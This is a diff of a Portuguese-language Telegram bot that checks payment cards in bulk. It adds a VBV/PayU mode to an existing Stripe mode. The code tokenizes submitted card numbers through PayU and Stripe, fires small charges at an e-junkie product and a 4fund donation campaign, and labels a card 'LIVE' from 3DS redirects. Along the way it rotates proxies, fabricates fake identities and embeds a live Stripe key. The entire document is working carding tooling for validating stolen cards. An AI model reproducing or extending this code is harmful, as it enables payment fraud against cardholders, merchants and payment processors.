@@ -36,16 +36,20 @@ https://t.me/DONATESCUENTAS
 """
 
 # ==============================================================================
-#  CONFIGURAÇÕES DA LOJA
+#  CONFIGURAÇÕES DA LOJA (STRIPE)
 # ==============================================================================
-# Lista de produtos (URL corrigida)
 LISTA_PRODUTOS = [
     "https://337212.e-junkie.com/product/1657384?custom=mkt",
 ]
 
-# Parâmetros fixos do log
 STRIPE_PK = "pk_live_UUFYTQ63roIxScFWo9jLfco5"
 STRIPE_ACC = "acct_1Rs7pfKxrOb09Lhq"
+
+# ==============================================================================
+#  CONFIGURAÇÕES VBV (PAYU)
+# ==============================================================================
+VBV_TARGET_URL = "https://4fund.com/3bvwxw/pay"
+VBV_BANK_DOMAINS = ["emv3dsweb", "acs2web", "santander.com.br", "itau.com.br", "bradesco.com.br", "caixa.gov.br"]
 
 # ==============================================================================
 #  ROTAÇÃO DE PROXIES
@@ -75,7 +79,7 @@ def get_proxy():
     return {"http": proxy_url, "https": proxy_url}, proxy_raw
 
 # ==============================================================================
-#  INDICADORES DE APROVAÇÃO
+#  INDICADORES DE APROVAÇÃO (STRIPE)
 # ==============================================================================
 APPROVED_INDICATORS = [
     "Your card's security code is incorrect.",
@@ -129,6 +133,12 @@ def generate_full_identity():
         "company": f"{last} Solutions Inc.", "country": "US"
     }
 
+def generate_vbv_identity():
+    first = random.choice(["Guilherme", "Rodrigo", "Felipe", "Lucas", "Gabriel", "Mateus", "Bruno", "Tiago", "Rafael", "Leonardo"])
+    last = random.choice(["Souza", "Silva", "Santos", "Oliveira", "Pereira", "Lima", "Costa", "Ferreira", "Rodrigues", "Almeida"])
+    email = f"{first.lower()}.{last.lower()}{random.randint(100, 9999)}@{random.choice(['gmail.com', 'outlook.com', 'hotmail.com'])}"
+    return {"full_name": f"{first} {last}", "email": email}
+
 def extract_ids_from_url(url):
     try:
         match = re.search(r'https://(\d+)\.e-junkie\.com/product/(\d+)', url)
@@ -140,8 +150,12 @@ def extract_ids_from_url(url):
     except:
         return None, None
 
-def check_card(card_data):
-    """Verifica um cartão e retorna o resultado formatado"""
+
+# ==============================================================================
+#  CHECK_CARD - MODO STRIPE
+# ==============================================================================
+def check_card_stripe(card_data):
+    """Verifica um cartão via Stripe (e-junkie) e retorna o resultado"""
     try:
         parts = card_data.strip().split('|')
         if len(parts) < 4:
@@ -151,12 +165,10 @@ def check_card(card_data):
     except:
         return f"❌ Erro nos dados ➔ {card_data}"
 
-    # Seleciona produto aleatório da lista
     target_url = random.choice(LISTA_PRODUTOS)
     client_id, item_id = extract_ids_from_url(target_url)
     identity = generate_full_identity()
 
-    # Rotação de Proxy
     proxy, proxy_raw = get_proxy()
     proxy_ip = proxy_raw.split(':')[0]
 
@@ -235,7 +247,7 @@ def check_card(card_data):
 
         if resp_stripe.status_code != 200:
             err = resp_stripe.json().get('error', {}).get('message', 'Erro Stripe')
-            return f"❌ Reprovado (Stripe) ➔ {card_data} ➔ {err} | Proxy: {proxy_ip}"
+            return f"❌ Reprovado (Stripe) ➔ {card_data} ➔ {err}"
 
         pm_id = resp_stripe.json().get('id')
 
@@ -262,12 +274,157 @@ def check_card(card_data):
             resp_text = resp_val.text
 
         if any(ind.lower() in resp_text.lower() for ind in APPROVED_INDICATORS):
-            return f"✅ Aprovado! ➔ {card_data} ➔ {site_msg} | Proxy: {proxy_ip}"
+            return f"✅ Aprovado! ➔ {card_data} ➔ {site_msg}"
         else:
-            return f"❌ Reprovado ➔ {card_data} ➔ {site_msg} | Proxy: {proxy_ip}"
+            return f"❌ Reprovado ➔ {card_data} ➔ {site_msg}"
 
     except Exception as e:
-        return f"⚠️ Erro de Conexão ➔ {card_data} ➔ {str(e)} | Proxy: {proxy_ip}"
+        return f"⚠️ Erro de Conexão ➔ {card_data} ➔ {str(e)}"
+
+
+# ==============================================================================
+#  CHECK_CARD - MODO VBV (PAYU)
+# ==============================================================================
+def check_card_vbv(card_data):
+    """Verifica um cartão via VBV/PayU (4fund) e retorna o resultado"""
+    try:
+        parts = card_data.strip().split("|")
+        if len(parts) < 4:
+            return f"❌ Formato inválido ➔ {card_data}"
+        cc_num, cc_month, cc_year, cc_cvv = parts[0], parts[1], parts[2], parts[3]
+        if len(cc_year) == 2: cc_year = "20" + cc_year
+    except:
+        return f"❌ Erro nos dados ➔ {card_data}"
+
+    identity = generate_vbv_identity()
+    proxy, proxy_raw = get_proxy()
+    proxy_ip = proxy_raw.split(':')[0]
+
+    try:
+        # Usando requests normais com proxy (curl_cffi não disponível no bot)
+        session = requests.Session()
+        session.proxies = proxy
+
+        # 1. Tokenização PayU
+        headers_token = {
+            'content-type': 'application/json',
+            'origin': 'https://secure.payu.com',
+            'referer': 'https://secure.payu.com/front/secure-form/ring/',
+        }
+        payload_token = {
+            "posId": "4297518",
+            "type": "SINGLE",
+            "card": {"number": cc_num, "expirationMonth": cc_month, "expirationYear": cc_year, "cvv": cc_cvv}
+        }
+        
+        resp_token = session.post('https://secure.payu.com/api/front/tokens', headers=headers_token, json=payload_token, timeout=20)
+        
+        if resp_token.status_code != 200:
+            return f"❌ DECLINED ➔ {cc_num} | Erro Token"
+
+        payu_token = resp_token.json().get('value')
+        if not payu_token:
+            return f"❌ DECLINED ➔ {cc_num} | Falha Token"
+
+        # 2. Start Payment 4fund
+        campaign_id = re.search(r'4fund.com/([^/]+)', VBV_TARGET_URL).group(1) if "4fund.com" in VBV_TARGET_URL else "3bvwxw"
+        
+        headers_pay = {
+            'origin': 'https://4fund.com',
+            'referer': VBV_TARGET_URL,
+            'x-requested-with': 'XMLHttpRequest',
+            'x-zrzutka-accept-language': 'en',
+            'accept': 'application/json, text/plain, */*',
+        }
+        
+        data = {
+            "id": str(uuid.uuid4()),
+            "amount": "2",
+            "method": "onlineSingle",
+            "externalProviderCode": payu_token,
+            "donationAmount": "0.4",
+            "showDataOnList": "true",
+            "showAmountOnList": "true",
+            "messageToOrganizer": "",
+            "contributor[email]": identity['email'],
+            "contributor[name]": identity['full_name'],
+            "externalTerminalName": "payu_main",
+            "externalProviderSpecificMethod": "card_single"
+        }
+        
+        resp_pay = session.post(
+            f'https://4fund.com/api/v2/chips/{campaign_id}/startPayment', 
+            headers=headers_pay, 
+            data=data, 
+            timeout=30,
+            allow_redirects=True
+        )
+        
+        res_json = {}
+        try:
+            res_json = resp_pay.json()
+            continue_url = res_json.get('continueUrl', '')
+        except:
+            continue_url = ''
+
+        all_urls = [r.url for r in resp_pay.history] + [resp_pay.url]
+        final_url = resp_pay.url
+        
+        resp_final = None
+        if continue_url:
+            try:
+                resp_final = session.get(continue_url, timeout=30, allow_redirects=True)
+                final_url = resp_final.url
+                all_urls += [r.url for r in resp_final.history] + [resp_final.url]
+            except:
+                pass
+
+        time.sleep(5)
+
+        is_approved = False
+        reason = "DECLINED"
+        page_content = ""
+        try:
+            page_content = resp_final.text if resp_final else resp_pay.text
+        except:
+            pass
+
+        # Lógica de detecção
+        if "statusCode=SUCCESS" in final_url and "/waiting" not in final_url:
+            is_approved = True
+            reason = "LIVE"
+        
+        elif "/waiting" in final_url and "statusCode=SUCCESS" in final_url:
+            is_approved = False
+            reason = "DECLINED"
+
+        else:
+            has_bank_in_history = any(any(domain in url for domain in VBV_BANK_DOMAINS) for url in all_urls)
+            has_bank_in_content = any(domain in page_content for domain in VBV_BANK_DOMAINS)
+            
+            if "secure.payu.com" in final_url and "threeds" in final_url:
+                if ("3D Secure 2" in page_content or "threeds" in page_content.lower()) and (has_bank_in_history or has_bank_in_content):
+                    is_approved = True
+                    reason = "LIVE"
+                else:
+                    is_approved = False
+                    reason = "DECLINED"
+            
+            elif any(domain in final_url for domain in VBV_BANK_DOMAINS):
+                is_approved = True
+                reason = "LIVE"
+            
+            else:
+                is_approved = False
+                reason = "DECLINED"
+
+        if is_approved:
+            return f"✅ LIVE ➔ {cc_num}"
+        else:
+            return f"❌ DECLINED ➔ {cc_num}"
+
+    except Exception as e:
+        return f"⚠️ PROXY ERROR ➔ {cc_num} ➔ {str(e)}"
 
 
 # ==============================================================================
@@ -278,35 +435,76 @@ def send_welcome(message):
     if not is_user_member(message.from_user.id):
         bot.reply_to(message, SUPPORT_MESSAGE, parse_mode="Markdown", disable_web_page_preview=True)
         return
-    bot.reply_to(message, "🚀 **Bot OMPLACE Online!**\n\nEnvie sua lista no formato:\n`NUMERO|MES|ANO|CVC` (um por linha)", parse_mode="Markdown")
+    bot.reply_to(message, 
+        "🚀 **Bot OMPLACE Online!**\n\n"
+        "📋 **Comandos disponíveis:**\n\n"
+        "`/stripe` — Checagem via Stripe (e-junkie)\n"
+        "`/vbv` — Checagem via VBV/PayU (4fund)\n\n"
+        "**Formato:** `NUMERO|MES|ANO|CVC` (um por linha)", 
+        parse_mode="Markdown")
 
-@bot.message_handler(commands=['chk'])
-def chk_cards(message):
+@bot.message_handler(commands=['stripe'])
+def stripe_cards(message):
     if not is_user_member(message.from_user.id):
         bot.reply_to(message, SUPPORT_MESSAGE, parse_mode="Markdown", disable_web_page_preview=True)
         return
 
-    msg_text = message.text.replace('/chk', '').strip()
+    msg_text = message.text.replace('/stripe', '').strip()
     if not msg_text:
-        bot.reply_to(message, "❌ Use: `/chk NUMERO|MES|ANO|CVC`", parse_mode="Markdown")
+        bot.reply_to(message, "❌ Use: `/stripe NUMERO|MES|ANO|CVC`", parse_mode="Markdown")
         return
 
     cards = msg_text.split('\n')
-    status_msg = bot.reply_to(message, f"⏳ Processando {len(cards)} cartões...")
+    status_msg = bot.reply_to(message, f"⏳ Processando {len(cards)} cartões via **Stripe**...", parse_mode="Markdown")
     
     results = []
     for i, card in enumerate(cards):
         if not card.strip(): continue
-        res = check_card(card)
+        res = check_card_stripe(card)
         results.append(f"💳 `{card.strip()}`\nResult: {res}")
         
         if (i + 1) % 2 == 0 or (i + 1) == len(cards):
-            full_res = "📊 **Resultados:**\n\n" + "\n\n".join(results)
+            full_res = "📊 **Resultados (STRIPE):**\n\n" + "\n\n".join(results)
             try:
                 bot.edit_message_text(full_res, message.chat.id, status_msg.message_id, parse_mode="Markdown")
             except:
                 pass
         time.sleep(2)
+
+@bot.message_handler(commands=['vbv'])
+def vbv_cards(message):
+    if not is_user_member(message.from_user.id):
+        bot.reply_to(message, SUPPORT_MESSAGE, parse_mode="Markdown", disable_web_page_preview=True)
+        return
+
+    msg_text = message.text.replace('/vbv', '').strip()
+    if not msg_text:
+        bot.reply_to(message, "❌ Use: `/vbv NUMERO|MES|ANO|CVC`", parse_mode="Markdown")
+        return
+
+    cards = msg_text.split('\n')
+    status_msg = bot.reply_to(message, f"⏳ Processando {len(cards)} cartões via **VBV/PayU**...", parse_mode="Markdown")
+    
+    results = []
+    for i, card in enumerate(cards):
+        if not card.strip(): continue
+        res = check_card_vbv(card)
+        results.append(f"💳 `{card.strip()}`\nResult: {res}")
+        
+        if (i + 1) % 2 == 0 or (i + 1) == len(cards):
+            full_res = "📊 **Resultados (VBV/PayU):**\n\n" + "\n\n".join(results)
+            try:
+                bot.edit_message_text(full_res, message.chat.id, status_msg.message_id, parse_mode="Markdown")
+            except:
+                pass
+        time.sleep(2)
+
+@bot.message_handler(commands=['chk'])
+def chk_cards(message):
+    """Compatibilidade com /chk — usa Stripe por padrão"""
+    msg_text = message.text.replace('/chk', '').strip()
+    message.text = f"/stripe {msg_text}"
+    stripe_cards(message)
 
 @bot.message_handler(func=lambda message: True)
 def auto_chk(message):
@@ -314,11 +512,14 @@ def auto_chk(message):
         if not is_user_member(message.from_user.id):
             bot.reply_to(message, SUPPORT_MESSAGE, parse_mode="Markdown", disable_web_page_preview=True)
             return
-        chk_cards(message)
+        # Auto-chk usa Stripe por padrão
+        msg_text = message.text
+        message.text = f"/stripe {msg_text}"
+        stripe_cards(message)
 
 # ==============================================================================
 #  MAIN
 # ==============================================================================
 if __name__ == "__main__":
-    print("Bot iniciado com rotação de proxies...")
+    print("Bot iniciado com comandos /stripe e /vbv + rotação de proxies...")
     bot.infinity_polling()
